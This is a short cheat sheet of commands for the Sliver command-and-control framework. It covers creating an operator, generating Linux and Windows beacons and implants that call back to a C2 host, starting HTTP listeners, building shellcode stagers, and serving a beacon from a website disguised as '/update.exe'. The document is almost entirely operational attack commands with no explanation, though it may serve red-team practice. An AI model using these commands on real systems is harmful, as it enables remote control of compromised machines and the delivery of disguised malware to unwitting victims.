## OPERATORS

```
new-operator --name user --lhost 0.0.0.0 --lport 31337 --permissions all
```

## BEACONS

```
generate beacon  --os linux  --arch amd64  --seconds 60  --jitter 30  --save /tmp/beacon_linux --http https://callbacks.${CLUSTER_DOMAIN}



beacons --interact ID
use ID
[X.X.X.X] sliver (MISERABLE_HACKSAW) > ls
[X.X.X.X] sliver (MISERABLE_HACKSAW) > tasks 
[X.X.X.X] sliver (MISERABLE_HACKSAW) > interactive
```

## LISTENERS 

```
http --lhost 0.0.0.0 --lport 8888

http --website test --lhost 0.0.0.0 --lport 8443
```

## PROFILES

```
profiles new --mtls <IP_C2>:8888 --os windows --arch amd64 --format exe monprofil
profiles generate monprofil --save /tmp/implant.exe

profiles new beacon --http <IP_C2>:80 --os windows --arch amd64 --minutes 5 --jitter 20 --format exe monbeaconprofil

profiles new beacon  --os linux  --arch amd64  --seconds 60  --jitter 30 --http https://callbacks.${CLUSTER_DOMAIN} --skip-symbols

stage-listener --url http://0.0.0.0:8887 --profile test

generate stager --lhost 0.0.0.0 --lport 80 --os linux --format shellcode

generate stager --os linux --format shellcode --save /tmp/stager.b

profiles generate monbeaconprofil --save /tmp/beacon.exe

websites add-content --website distrib --web-path /update.exe --content /tmp/beacon.exe

websites add-content --content /tmp/index.html --web-path / --website test

```